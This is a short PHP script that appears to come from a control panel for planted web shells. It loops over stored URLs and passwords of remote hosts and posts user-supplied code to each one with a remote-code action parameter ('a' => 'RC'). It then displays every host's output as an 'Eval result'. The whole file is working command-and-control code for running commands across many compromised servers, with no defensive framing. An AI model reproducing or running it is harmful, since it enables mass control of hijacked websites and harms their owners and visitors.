<?php
include('init.php');
if(!empty($_POST['do'])) {
	if(($_POST['do']=="exec") && !empty($_POST['code']) && isset($_POST['id'])) {
	 
		echo '<br/><h1>Eval result&nbsp[<a href="#" title="Hide/Show Eval Result" onclick="ll()">Hide</a>]</h1><div id=lol class=content>';
		$massive=explode(',',$_POST['id']);
		foreach($massive as $id) {
		if($id=='on')continue;
			echo "<span>".htmlspecialchars($database[$id]['url'])."</span>";
			$postdata = http_build_query(
				array(
					'pass' => $database[$id]['pass'],
					'a' => 'RC',
					'p1' => $_POST['code']
				)
			);
			echo '<pre class="ml1">';
			echo get_content($database[$id]['url'], $postdata);
			echo '</pre>';
		}
		echo '</div>';
		}
	}
	
?>